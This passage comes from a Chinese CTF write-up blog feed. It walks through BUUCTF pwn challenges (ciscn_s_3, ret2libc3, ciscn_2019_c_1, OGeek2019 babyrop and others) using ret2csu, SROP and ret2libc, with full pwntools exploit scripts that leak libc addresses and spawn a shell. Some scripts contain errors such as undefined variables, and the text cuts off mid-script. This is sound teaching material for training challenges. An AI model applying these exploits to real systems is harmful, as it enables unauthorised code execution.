<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">ret_addr = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="comment">#buf_addr = stack_addr-0x118</span></span><br><span class="line">buf_addr = stack_addr-<span class="number">0x148</span></span><br></pre></td></tr></table></figure>



<h2 id="0x03-4"><a href="#0x03-4" class="headerlink" title="0x03"></a>0x03</h2><h3 id="第一种做法：ret2csu控制执行execve"><a href="#第一种做法：ret2csu控制执行execve" class="headerlink" title="第一种做法：ret2csu控制执行execve"></a>第一种做法：ret2csu控制执行execve</h3><p>__libc_csu_init       （具体可以看<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/">ctf-wiki</a>中的介绍）</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082004182.png" alt="image-20230808200450127"></p>
<p>需要将各寄存器置为： rax  0x3B  rdi &#x3D; ‘&#x2F;bin&#x2F;sh’ rsi &#x3D; 0 rdx &#x3D; 0</p>
<p>ROPgadget 能找到控制rdi和rsi的，以及syscall  （不过实际上没有用rsi的，因为csu中有pop r14和mov rsi, r14指令，可以通过栈上布置将rsi置为0）</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082024016.png" alt="image-20230808202429992"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082008232.png" alt="image-20230808200850211"></p>
<p>现在还要想办法控制rdx</p>
<p>通过__libc_csu_init可以看到，我们可以先执行pop r13然后再执行mov rdx, r13将rdx置为0</p>
<p>同时还要注意： </p>
<ol>
<li>0x400589: call [r12 + rbx * 8], 会执行r12+rbx<em>8地址指向的函数，不过这里没有需要执行的函数，所以可以在buf里放了个ret;的地址…, 然后让r12 + rbx</em>8指向buf；call函数之前会自动将下一条指令入栈，接着执行ret则rsp指针相当于不变</li>
<li>cmp rbx, rbp; jnz short loc_400580, 如果rbx和rbp相同会循环。想要绕过需要使 rbx &#x3D; 0  rbp &#x3D; 1 </li>
<li>泄露函数地址后直接重进的vul函数，buf的地址不变</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall = <span class="number">0x400501</span></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">ret_addr = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line">payload = p64(ret_addr) + <span class="string">b&#x27;/bin/sh\0&#x27;</span><span class="comment">#为之后函数跳转和传入binsh做准备</span></span><br><span class="line">payload += p64(<span class="number">0x4004e2</span>) <span class="comment"># rax=0x3b</span></span><br><span class="line">payload += p64(<span class="number">0x40059a</span>) <span class="comment"># 6个pop</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># rbx = 0, rbp = 1</span></span><br><span class="line">payload += p64(buf_addr) + p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># r12 = buf_addr，r13 r14 r15 = 0</span></span><br><span class="line">payload += p64(<span class="number">0x400580</span>)         <span class="comment">#执行寄存器r12指向的函数  （也就是ret）；把rdx设为0            </span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span> <span class="comment"># 这里执行到0x400596后又会重新pop一遍, 开头执行add rsp, 8让rsp跳过了栈上的一个数据，如何执行6pop，所以栈上布置7个0</span></span><br><span class="line">payload += p64(pop_rdi) + p64(buf_addr + <span class="number">8</span>) <span class="comment"># rdi = &amp;&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="第二种：SROP"><a href="#第二种：SROP" class="headerlink" title="第二种：SROP"></a>第二种：SROP</h3><p>具体可参考<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">ctf-wiki</a></p>
<p>本题解法可参考<a href="https://www.cnblogs.com/wudiiv11/p/buuctf-ciscn_2019_s_3.html#:~:text=%E8%A7%A3%E6%B3%952%20sigret-,%E5%8E%9F%E7%90%86,-linux%E5%A4%84%E7%90%86signal">这篇博客</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = buf_addr</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(<span class="number">0x4004da</span>) + p64(syscall) + <span class="built_in">bytes</span>(sigframe)</span><br></pre></td></tr></table></figure>

<p>利用pwntools的sigframe模块即可</p>
<p>其实这两种解法都是以程序读入足够多的字节为条件的</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>] </span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,29591)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">syscall = <span class="number">0x400501</span></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">ret_addr = <span class="number">0x4003a9</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="comment">#buf_addr = stack_addr-0x118</span></span><br><span class="line">buf_addr = stack_addr-<span class="number">0x148</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">payload = p64(ret_addr) + <span class="string">b&#x27;/bin/sh\00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x4004e2</span>) <span class="comment"># rax=0x3b</span></span><br><span class="line">payload += p64(<span class="number">0x40059a</span>) <span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># rbx = 0, rbp = 1</span></span><br><span class="line">payload += p64(buf_addr) + p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># r12 = buf_addr</span></span><br><span class="line">payload += p64(<span class="number">0x400580</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(buf_addr + <span class="number">8</span>) <span class="comment"># rdi = &amp;&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"><span class="comment">#payload += p64(vul_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sigframe = SigreturnFrame()</span></span><br><span class="line"><span class="string">sigframe.rax = constants.SYS_execve</span></span><br><span class="line"><span class="string">sigframe.rdi = buf_addr</span></span><br><span class="line"><span class="string">sigframe.rsi = 0x0</span></span><br><span class="line"><span class="string">sigframe.rdx = 0x0</span></span><br><span class="line"><span class="string">sigframe.rip = syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = b&#x27;/bin/sh\0&#x27;.ljust(0x10, b&#x27;a&#x27;) + p64(0x4004da) + p64(syscall) + bytes(sigframe)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libc3合集</title>
    <url>/posts/be5100f9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>目前一些比较经典的ret2libc2的总合集，包括32位和64位，有libc文件和没有libc文件</p>
<span id="more"></span>

<p>ctf-wiki ret2libc3<br>考点：栈溢出rop</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 32-bit 开NX</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081254951.png"></p>
<p>漏洞和内存分析和之前的系列题类似，不赘述了</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081256604.png" alt="image-20230808125622556"></p>
<p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081257190.png" alt="image-20230808125734100"></p>
<p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #计算出libc基地址</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #计算出system的真实地址</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>或者写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>

<h3 id="一定注意发送pay前接收的内容"><a href="#一定注意发送pay前接收的内容" class="headerlink" title="一定注意发送pay前接收的内容"></a>一定注意发送pay前接收的内容</h3><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>搜索libc常用方法：</p>
<ul>
<li><p>LibcSearcher</p>
</li>
<li><p>网站查找 <a href="https://libc.rip/">libc-database</a><br><a href="https://libc.blukat.me/?q=_rtld_global:0">llibc database search</a></p>
</li>
<li><p>libc-database</p>
</li>
<li><p>参考资料：<br><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br><a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></p>
<p><a href="https://www.jianshu.com/p/83f55c55c173">对于返回地址不同而导致的输入偏移不同</a></p>
</li>
</ul>
<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>简单的ret2libc3<br>file checksec —— 64-bit 开NX</p>
<h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915622.webp"></p>
<p>再看看IDA</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081258517.png"></p>
<p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915382.png"></p>
<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>分析大致流程就是</p>
<ol>
<li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
<li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
<li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
</ol>
<h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
<blockquote>
<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
</blockquote>
<p>覆盖数据payload&#x3D;b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p>
<p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p>
<blockquote>
<p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p>
</blockquote>
<p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p>
<p>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参<br><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915046.webp"></p>
<p>注意栈对齐<br><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081258686.webp"></p>
<p>还有最后还要再输一个0</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915042.webp"></p>
<p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p>
<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p>BUUCTF pwn<br>考点： ret2libc3</p>
<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>64位程序，开启NX</p>
<p>没有system函数和&#x2F;bin&#x2F;sh字符串</p>
<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。</p>
<p>main函数</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142732.png" alt="image-20230807205450139"></p>
<p>sub_804871F函数</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142587.png" alt="image-20230807205837589"></p>
<p>sub_80487D0函数</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142267.png" alt="image-20230807205912958"></p>
<p>观察程序我们可以发现sub_80487D0函数有栈溢出漏洞</p>
<p>然而想要利用栈溢出需要我们达成两个目标</p>
<p>1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0</p>
<p>2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出</p>
<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\x00’，可起到截断字符串长度的效果。</p>
<p>第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 &#x3D; 255个字节，所以让buf[7] &#x3D; ‘\xff’即可。代码中的buf[v5-1] &#x3D; 0改变的是字符串末尾’\x00’的值，不影响buf[7] 。</p>
<p>所以第一次读取的payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher</p>
<p>main函数地址用elf.sym[‘main’]是找不到的，objdump -t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="comment">#main_addr = elf.plt[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line">libc_base = write_addr -  libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>经典ret2libc3</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072259415.png" alt="image-20230807225923356"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28146</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;write&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(got_addr)+p32(<span class="number">0xD</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])<span class="comment">#0xf7db1190</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr = &quot;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span 